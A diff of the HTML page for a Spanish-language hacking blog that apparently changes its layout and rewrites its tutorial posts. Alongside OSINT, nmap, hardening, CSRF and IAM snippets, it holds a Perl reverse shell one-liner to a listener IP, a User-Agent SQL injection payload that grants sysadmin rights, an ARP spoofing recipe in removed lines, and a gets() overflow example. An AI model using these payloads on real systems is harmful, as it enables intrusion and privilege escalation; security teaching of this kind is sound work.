@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEVIATHAM // Interceptando la Realidad //</title>
+    <title>LEVIATHAM // Terminal de Acceso // KaliHunter32</title>
     <meta name="description" content="Plataforma de investigación y recursos en ciberseguridad, hacking ético y análisis de sistemas.">
     <meta name="keywords" content="ciberseguridad, hacking, seguridad informática, análisis de vulnerabilidades, exploits, payloads, pentesting, CTF, programación, código">
     <meta name="author" content="KaliHunter32">
-    <meta property="og:title" content="LEVIATHAM // Interceptando la Realidad //">
-    <meta property="og:description" content="Plataforma de investigación y recursos en ciberseguridad, hacking ético y análisis de sistemas.">
+    <meta property="og:title" content="LEVIATHAM // Terminal de Acceso //">
     <meta property="og:type" content="website">
 
     <style>
         /* Variables y Configuración General */
         :root {
-            --bg-color: #0d0208;
+            --bg-color: #000000; /* Fondo más oscuro */
             --main-color: #00ff00;
             --highlight-color: #00ffff;
             --shadow-color: rgba(0, 255, 0, 0.7);
@@ -27,9 +26,10 @@
             color: var(--main-color);
             font-family: var(--font-family);
             margin: 0;
-            padding: 0;
+            padding-top: 50px; /* Espacio para la barra de navegación fija */
             overflow-x: hidden;
             text-shadow: 0 0 1px var(--main-color);
+            line-height: 1.5;
         }
 
         /* Animaciones */
@@ -39,153 +39,153 @@
             50% { background-color: transparent; box-shadow: none; }
         }
 
-        /* Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background-color: #004d00; border: 1px solid var(--main-color); }
-
         /* Canvas (Lluvia Matrix) */
         #matrixCanvas {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            z-index: 0; pointer-events: none; opacity: 0.2;
+            z-index: 0; pointer-events: none; opacity: 0.15; /* Sutil */
         }
 
-        /* Layout Principal */
-        .grid-container {
-            display: grid;
-            grid-template-columns: 200px 1fr; /* Menú de 200px y Contenido flexible */
-            gap: 20px;
+        /* Contenedor Principal: Centrado y Opaco */
+        .container {
             width: 95%;
-            max-width: 1200px;
+            max-width: 900px;
             margin: 10px auto;
+            padding: 20px;
             position: relative;
             z-index: 10;
             background-color: rgba(0, 0, 0, 0.95);
-            min-height: 98vh;
-            border: 1px solid var(--main-color);
-            box-shadow: 0 0 25px var(--shadow-color);
+            border-left: 1px solid var(--main-color);
+            border-right: 1px solid var(--main-color);
+            min-height: calc(100vh - 60px);
         }
 
-        /* Menú de Navegación Lateral */
+        /* --- Barra de Navegación Fija (Menú) --- */
         nav {
-            padding: 15px 10px;
-            border-right: 1px solid var(--highlight-color);
-            position: sticky;
+            position: fixed;
             top: 0;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-        }
-        nav h3 {
-            color: var(--highlight-color);
-            border-bottom: 1px solid var(--highlight-color);
-            margin-top: 0;
-            padding-bottom: 5px;
-            text-shadow: 0 0 3px var(--highlight-color);
+            left: 0;
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.98);
+            border-bottom: 2px solid var(--highlight-color);
+            padding: 5px 0;
+            z-index: 100; /* Siempre encima */
+            text-align: center;
+            box-shadow: 0 0 15px var(--highlight-color);
         }
         nav ul {
             list-style: none;
             padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap; /* Para que funcione bien en móvil */
+        }
+        nav li {
+            margin: 0 10px;
         }
         nav a {
             color: var(--main-color);
             text-decoration: none;
+            padding: 5px 10px;
             display: block;
-            padding: 5px 0;
-            transition: color 0.1s;
+            transition: all 0.2s;
         }
         nav a:hover {
             color: var(--highlight-color);
-            text-decoration: underline;
+            background-color: rgba(0, 255, 255, 0.1);
             text-shadow: 0 0 5px var(--highlight-color);
-        }
-
-        /* Contenedor Principal (Main) */
-        .content-area {
-            padding: 15px 25px;
         }
 
         /* Cabecera y Logo */
         header {
             text-align: left;
-            border-bottom: 2px solid var(--main-color);
             padding-bottom: 10px;
             margin-bottom: 30px;
         }
         #logo-ascii {
-            font-size: 0.9em;
+            font-size: 0.85em;
             line-height: 1.1;
             white-space: pre;
-            margin-top: 15px;
             color: #4CAF50;
-            border: 1px dashed #004d00;
             padding: 5px;
-            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
-        }
-        #main-title {
-            font-size: 2.2em;
-            text-shadow: 0 0 10px var(--main-color);
-            min-height: 40px;
+            border: 1px dashed #004d00;
             display: inline-block;
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
+            margin-bottom: 15px;
         }
-        
-        /* Status Bar con LED Parpadeante */
         .status-led {
-            height: 10px;
-            width: 10px;
-            background-color: var(--main-color);
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
-            animation: led-flash 1s infinite;
+            height: 10px; width: 10px; background-color: var(--main-color); border-radius: 50%;
+            display: inline-block; margin-right: 5px; animation: led-flash 1s infinite;
         }
 
-        /* Prompts y Títulos de Sección */
-        h2 {
-            color: var(--highlight-color);
-            border-bottom: 1px dashed var(--highlight-color);
-            padding-bottom: 8px;
-            margin-top: 40px;
-            text-shadow: 0 0 5px var(--highlight-color);
+        /* Título Principal y Prompt */
+        #main-title {
+            font-size: 2.0em;
+            text-shadow: 0 0 10px var(--main-color);
+            min-height: 35px;
+            display: block;
+            margin-bottom: 15px;
         }
-        
         .prompt::before {
             content: "kali@leviatham:~# ";
             color: var(--main-color);
         }
 
-        /* Artículos y Contenido */
+        /* Títulos de Sección */
+        h2 {
+            color: var(--highlight-color);
+            border-bottom: 1px dashed var(--highlight-color);
+            padding-bottom: 5px;
+            margin-top: 40px;
+            text-shadow: 0 0 5px var(--highlight-color);
+        }
+
+        /* Artículos (Posts) */
         article {
-            background-color: rgba(0, 20, 0, 0.3);
+            background-color: rgba(0, 20, 0, 0.2);
             border-left: 3px solid var(--highlight-color);
             padding: 15px 20px;
             margin-bottom: 30px;
             transition: all 0.2s ease-in-out;
-            position: relative; /* Para el separador */
+            border-top: 1px solid rgba(0, 255, 255, 0.2);
         }
         article:hover { border-left-color: #ffff00; box-shadow: inset 0 0 10px rgba(255, 255, 0, 0.2); }
         article h3 { color: #ffff00; text-shadow: 0 0 3px #ffff00; }
-
-        /* Separador Hacking */
-        .separator {
-            width: 100%;
-            height: 1px;
-            background: repeating-linear-gradient(to right, var(--main-color), var(--main-color) 4px, transparent 4px, transparent 8px);
-            margin: 20px 0;
-            opacity: 0.5;
-        }
         
-        /* Bloques de código */
+        /* Bloque de Código (Estilo Terminal / CD de Linux) */
         pre {
-            background-color: #000;
+            background-color: #1a1a1a; /* Fondo más oscuro que el artículo */
             color: #f0f0f0;
             border: 1px solid var(--main-color);
             padding: 15px;
             overflow-x: auto;
             font-family: var(--font-family);
             box-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            margin-top: 15px;
+            position: relative;
         }
         
-        /* Imágenes */
+        /* Simulación de barra de título del terminal */
+        pre::before {
+            content: " [ kali@shell:~ ] ";
+            position: absolute;
+            top: -1px;
+            left: 0;
+            background-color: #008000; /* Verde más oscuro */
+            color: white;
+            font-weight: bold;
+            padding: 2px 10px;
+            font-size: 0.8em;
+            border-right: 1px solid var(--main-color);
+        }
+        
+        /* Añadir espacio para que el código no se superponga con el título simulado */
+        pre code {
+            display: block;
+            padding-top: 15px; 
+        }
+
+        /* Imágenes (Para facilitar la subida de fotos, simplemente arrastra al repo y usa el nombre) */
         img {
             max-width: 100%;
             height: auto;
@@ -199,27 +199,41 @@
 
         /* Pie de página (Protocolo) */
         footer {
-            margin-top: 50px;
             border-top: 1px dashed var(--error-color);
             padding-top: 20px;
+            margin-top: 50px;
             font-size: 0.85em;
             text-align: center;
             color: #aaa;
         }
-        footer h3 {
-            color: var(--error-color); 
-            border-bottom: 1px solid var(--error-color);
-            text-shadow: 0 0 5px rgba(255, 0, 0, 0.7);
+        footer h3 { color: var(--error-color); border-bottom: 1px solid var(--error-color); }
+        
+        /* Ajustes para Móviles (Responsive) */
+        @media (max-width: 600px) {
+            body { padding-top: 80px; } /* Más espacio para la nav bar en 2 líneas */
+            nav ul { flex-direction: column; }
+            nav li { margin: 5px 0; }
+            #main-title { font-size: 1.5em; }
+            #logo-ascii { font-size: 0.7em; }
         }
+
     </style>
 </head>
 <body>
 
     <canvas id="matrixCanvas"></canvas> 
     
-    <div class="grid-container">
-        
-        <nav>
+    <nav>
+        <ul>
+            <li><a href="#recursos">[ 0x01 ] Recursos</a></li>
+            <li><a href="#defensivo">[ 0x02 ] Defensivo</a></li>
+            <li><a href="#historico">[ 0x03 ] Archivo</a></li>
+            <li><a href="#protocolo">[ 0x04 ] Protocolo</a></li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <header>
             <div id="logo-ascii">
                 [ Iniciando Codificación ]
                 <pre>
@@ -233,197 +247,140 @@
                   \_/
                 </pre>
                 [ <span class="status-led"></span> Status: Online ]
-                <br>[ Imdustrias Lazarus ]
-                <br>[ KaliHunter32 ]
+                <br>[ Imdustrias Lazarus ] | [ KaliHunter32 ]
             </div>
-            <div class="separator" style="margin-top: 25px;"></div>
             
-            <h3>Módulos de Acceso</h3>
-            <ul>
-                <li><a href="#recursos">[ 0x01 ] Recursos en Línea</a></li>
-                <li><a href="#defensivo">[ 0x02 ] Seguridad Defensiva</a></li>
-                <li><a href="#historico">[ 0x03 ] Archivo Histórico</a></li>
-                <li><a href="#protocolo">[ 0x04 ] Protocolo</a></li>
-            </ul>
-        </nav>
+            <h1 id="main-title" class="prompt"></h1> 
+        </header>
 
-        <div class="content-area">
-            <header>
-                <h1 id="main-title" class="prompt"></h1> 
-            </header>
-
-            <section id="recursos">
-                <h2>// 0x01 RECURSOS EN LÍNEA: Herramientas y Técnicas //</h2>
-                
-                <article>
-                    <h3>[ OSINT ] Detección de Tecnologías con Wappalyzer</h3>
-                    <p>La inteligencia de fuentes abiertas (OSINT) es crucial. Antes de interactuar, necesitamos saber qué tecnologías usa el objetivo. Wappalyzer es una extensión de navegador (o herramienta CLI) que identifica frameworks, CMS, servidores, y más.</p>
-                    <pre><code>
+        <section id="recursos">
+            <h2>// 0x01 RECURSOS EN LÍNEA: Herramientas y OSINT //</h2>
+            
+            <article>
+                <h3>[ OSINT ] Detección de Tecnologías con Wappalyzer</h3>
+                <p>La inteligencia de fuentes abiertas (OSINT) es crucial. Antes de interactuar, necesitamos saber qué tecnologías usa el objetivo. Wappalyzer es una extensión de navegador (o herramienta CLI) que identifica frameworks, CMS, servidores, y más.</p>
+                <pre><code>
 # Comando CLI de Wappalyzer (requiere instalación)
-wappalyzer https://target.com
-                    </code></pre>
-                </article>
+wappalyzer https://dominioobjetivo.com
+                </code></pre>
+                <img src="Imagen_Wappalyzer.png" alt="Captura de pantalla de la detección de tecnologías." style="max-width: 50%;">
+                <p> **[ FÁCIL DE EDITAR ]** Para cambiar la imagen, simplemente sube "Imagen_Wappalyzer.png" a tu repositorio y reemplaza el texto ALT.</p>
+            </article>
 
-                <article>
-                    <h3>[ MAN IN THE MIDDLE ] Configuración de ARP Spoofing (Ejemplo)</h3>
-                    <p>El ataque de ARP Spoofing (`ARP Cache Poisoning`) es la base para muchos ataques 'Man in the Middle' dentro de una red local. El objetivo es engañar al router y al objetivo para que envíen todo el tráfico a la máquina del atacante.</p>
-                    <pre><code>
-# En Kali Linux, usando ettercap (GUI o CLI) o arpspoof.
+            <article>
+                <h3>[ ESCANEO ] Nmap: Escaneo de Versiones y OS</h3>
+                <p>Nmap es el estándar de la industria. Para obtener la información más detallada sobre los puertos abiertos, incluyendo el sistema operativo y las versiones exactas de los servicios, se utiliza la opción `-A` (agresivo).</p>
+                <pre><code>
+# Escaneo agresivo y rápido (T4)
+nmap -A -T4 192.168.1.1/24
+                </code></pre>
+            </article>
 
-# Habilitar el reenvío de IP para que la red siga funcionando
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# Comando arpspoof: engaña al target para que piense que el router es el atacante
-arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
-                    </code></pre>
-                </article>
-
-                <article>
-                    <h3>[ CÓDIGO ] Script para validar contraseñas seguras (Python)</h3>
-                    <p>Función educativa para validar la complejidad de una contraseña, exigiendo mayúsculas, minúsculas, números y símbolos, y una longitud mínima.</p>
-                    <pre><code>
-import re
-
-def is_strong(password):
-    if len(password) < 12:
-        return False
-    if not re.search(r"[a-z]", password):
-        return False
-    if not re.search(r"[A-Z]", password):
-        return False
-    if not re.search(r"\d", password):
-        return False
-    if not re.search(r"[$@#%&]", password): # Caracteres especiales
-        return False
-    return True
-
-print(is_strong("SecurePass123#")) # True
-print(is_strong("weak")) # False
-                    </code></pre>
-                </article>
-
-                <div class="separator"></div>
-
-            </section>
+        </section>
+        
+        <section id="defensivo">
+            <h2>// 0x02 SEGURIDAD DEFENSIVA: Mitigación y Hardening //</h2>
             
-            <section id="defensivo">
-                <h2>// 0x02 SEGURIDAD DEFENSIVA: Mitigación y Hardening //</h2>
-                
-                <article>
-                    <h3>[ HARDENING ] Deshabilitar servicios innecesarios en Linux</h3>
-                    <p>La superficie de ataque se reduce deshabilitando los servicios que no se usan. Menos servicios = menos posibles puntos de entrada. Ejemplo con `systemctl`:</p>
-                    <pre><code>
+            <article>
+                <h3>[ HARDENING ] Deshabilitar servicios innecesarios en Linux</h3>
+                <p>La superficie de ataque se reduce deshabilitando los servicios que no se usan. Menos servicios = menos posibles puntos de entrada. Ejemplo con `systemctl` en sistemas basados en Systemd.</p>
+                <pre><code>
 # Ver todos los servicios activos
 systemctl list-units --type=service --state=running
 
 # Deshabilitar un servicio (ej. Apache si no se usa)
 sudo systemctl stop apache2
 sudo systemctl disable apache2
+                </code></pre>
+            </article>
 
-# Si el servicio es realmente innecesario, también se puede enmascarar
-sudo systemctl mask apache2
-                    </code></pre>
-                </article>
-
-                <article>
-                    <h3>[ MITIGACIÓN ] Prevención de CSRF (Token Syncronizer)</h3>
-                    <p>Cross-Site Request Forgery (CSRF) se mitiga con tokens de sincronización únicos por sesión. El servidor genera un token y lo verifica en cada solicitud POST importante.</p>
-                    <pre><code>
-// Ejemplo conceptual en PHP (parte del formulario)
-&lt;?php
-    session_start();
-    $token = bin2hex(random_bytes(32));
-    $_SESSION['csrf_token'] = $token;
-?&gt;
-
-&lt;form method="POST" action="/cambiar-pass"&gt;
-    &lt;input type="hidden" name="csrf_token" value="&lt;?= $token ?&gt;"&gt;
-    &lt;!-- Campos del formulario --&gt;
-&lt;/form&gt;
-                    </code></pre>
-                </article>
-                
-                <article>
-                    <h3>[ CLOUD ] IAM Policy Mínimo para S3 (Principio de Menor Privilegio)</h3>
-                    <p>En seguridad Cloud, el Principio de Menor Privilegio (PoLP) es vital. Este ejemplo de política IAM solo permite la acción de lectura (`s3:GetObject`) en una carpeta específica, nada más.</p>
-                    <pre><code>
-{
-    "Version": "2012-10-17",
-    "Statement": [
-        {
-            "Effect": "Allow",
-            "Action": [
-                "s3:GetObject"
-            ],
-            "Resource": [
-                "arn:aws:s3:::mi-bucket-seguro/public/*"
-            ]
-        }
-    ]
+            <article>
+                <h3>[ MITIGACIÓN ] Prevención de CSRF (Token Syncronizer)</h3>
+                <p>Cross-Site Request Forgery (CSRF) se mitiga con tokens de sincronización únicos por sesión. El servidor genera un token y lo verifica en cada solicitud POST importante.</p>
+                <pre><code>
+// Ejemplo conceptual en PHP (verificación)
+if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    die("Error: Token CSRF inválido.");
 }
-                    </code></pre>
-                </article>
+// Continuar con la acción...
+                </code></pre>
+            </article>
+            
+            <article>
+                <h3>[ CLOUD ] IAM Policy Mínimo para S3 (Principio de Menor Privilegio)</h3>
+                <p>En seguridad Cloud, el Principio de Menor Privilegio (PoLP) es vital. Este ejemplo de política IAM solo permite la acción de lectura (`s3:GetObject`) en una carpeta específica, nada más.</p>
+                <pre><code>
+{
+    "Effect": "Allow",
+    "Action": ["s3:GetObject"],
+    "Resource": ["arn:aws:s3:::mi-bucket-seguro/public/*"]
+}
+                </code></pre>
+            </article>
 
-                <div class="separator"></div>
-                
-            </section>
+        </section>
 
-            <section id="historico">
-                <h2>// 0x03 ARCHIVO HISTÓRICO: Explotación y Conceptos Base //</h2>
-                
-                <article>
-                    <h3>[ TÉCNICA ] Enumeración de Subdominios (OSINT)</h3>
-                    <p>La recolección de información pasiva es el primer paso en un pentesting. Usar herramientas como `sublist3r` o métodos de certificados SSL son cruciales. Este es un ejemplo de un comando `amass` básico.</p>
-                    
-                    <pre><code>
-amass enum -d dominioobjetivo.com -o /tmp/subdomains.txt
-                    </code></pre>
-                    <img src="https://via.placeholder.com/600x300/004d00/00ffff?text=Diagrama+Flujo+OSINT" alt="Flujo de Recolección de Información Pasiva">
-                </article>
-
-                <article>
-                    <h3>[ SHELL ] Reverse Shell de Perl (Alternativa a Bash)</h3>
-                    <p>Si Bash no está disponible o tiene restricciones, Perl es una alternativa común para obtener una shell inversa en sistemas Linux/Unix.</p>
-                    <pre><code>
+        <section id="historico">
+            <h2>// 0x03 ARCHIVO HISTÓRICO: Explotación y Conceptos Base //</h2>
+            
+            <article>
+                <h3>[ SHELL ] Reverse Shell de Perl (Alternativa a Bash)</h3>
+                <p>Si Bash no está disponible o tiene restricciones, Perl es una alternativa común para obtener una shell inversa en sistemas Linux/Unix. Este payload es útil cuando otros fallan.</p>
+                <pre><code>
 perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'
-                    </code></pre>
-                </article>
+                </code></pre>
+            </article>
 
-                <article>
-                    <h3>[ REDES ] Escaneo de Versiones de Servicio con Nmap</h3>
-                    <p>Además de escanear puertos, Nmap puede intentar determinar la versión del software que se ejecuta en ese puerto, lo cual es vital para buscar exploits específicos. El parámetro `-sV` es para "version scan".</p>
-                    <pre><code>
-nmap -sV -p 21,22,80,443 192.168.1.100
-                    </code></pre>
-                </article>
-                
-                <article>
-                    <h3>[ WEB ] Búsqueda de Inyecciones de Código en Headers HTTP</h3>
-                    <p>No todas las vulnerabilidades están en los parámetros GET/POST. A menudo, las aplicaciones procesan los Headers HTTP (User-Agent, Referer, X-Forwarded-For) sin sanitizar, lo que puede llevar a inyecciones.</p>
-                    <pre><code>
-# Ejemplo de payload en el Header User-Agent
+            <article>
+                <h3>[ WEB ] Búsqueda de Inyecciones de Código en Headers HTTP</h3>
+                <p>No todas las vulnerabilidades están en los parámetros GET/POST. Las aplicaciones a menudo procesan los Headers HTTP (User-Agent, Referer) sin sanitizar. El siguiente ejemplo es un payload para intentar una Inyección SQL ciega.</p>
+                <pre><code>
+# Payload en el Header User-Agent
 User-Agent: '; EXEC sp_addsrvrolemember 'usuario', 'sysadmin' --
-                    </code></pre>
-                    <p>Esto busca una inyección SQL ciega en el backend que procese el User-Agent.</p>
-                </article>
-                
-                <div class="separator"></div>
-                </section>
+                </code></pre>
+            </article>
 
-            <section id="protocolo">
-                <footer>
-                    <h3>[ PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
-                    <p><strong>Clasificación: ALTO SECRETO // Solo para Fines Educativos //</strong></p>
-                    <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa. **LEVIATHAM no se hace responsable.**</p>
-                    <p>Se espera que los visitantes actúen con **integridad, ética y respeto** por la ley y la propiedad digital.</p>
-                    <p>// El conocimiento es una herramienta: su impacto depende de las manos que lo empuñen //</p>
-                </footer>
-            </section>
+            <article>
+                <h3>[ LENGUAJE C ] Función Vulnerable a Buffer Overflow (Concepto)</h3>
+                <p>La vulnerabilidad de *buffer overflow* ocurre cuando un programa escribe más datos de lo asignado. Aquí un ejemplo en C del uso inseguro de `gets()`:</p>
+                <pre><code>
+#include &lt;stdio.h&gt;
 
-        </div>
+void vulnerable_function() {
+    char buffer[10]; 
+    printf("Introduce un string: ");
+    gets(buffer); // FUNCIÓN INSEGURA
+}
+                </code></pre>
+            </article>
+            
+            <article>
+                <h3>[ CODIFICACIÓN ] Uso de Base64 para ofuscación básica</h3>
+                <p>Base64 es un sistema de codificación, no de cifrado, pero a menudo se utiliza para ofuscar (ocultar a simple vista) strings en payloads o archivos de configuración. Ejemplo en Bash:</p>
+                <pre><code>
+# Codificar:
+echo "Comando oculto" | base64
+# Salida: Q29tYW5kbyBvY3VsdG8K
+
+# Decodificar:
+echo "Q29tYW5kbyBvY3VsdG8K" | base64 -d
+                </code></pre>
+            </article>
+
+        </section>
+
+        <section id="protocolo">
+            <footer>
+                <h3>[ PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
+                <p><strong>Clasificación: ALTO SECRETO // Solo para Fines Educativos //</strong></p>
+                <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa. **LEVIATHAM no se hace responsable.**</p>
+                <p>Se espera que los visitantes actúen con **integridad, ética y respeto** por la ley y la propiedad digital.</p>
+                <p>// El conocimiento es una herramienta: su impacto depende de las manos que lo empuñen //</p>
+            </footer>
+        </section>
+
     </div>
 
     <script src="script.js"></script>
 </body>
 </html>
-
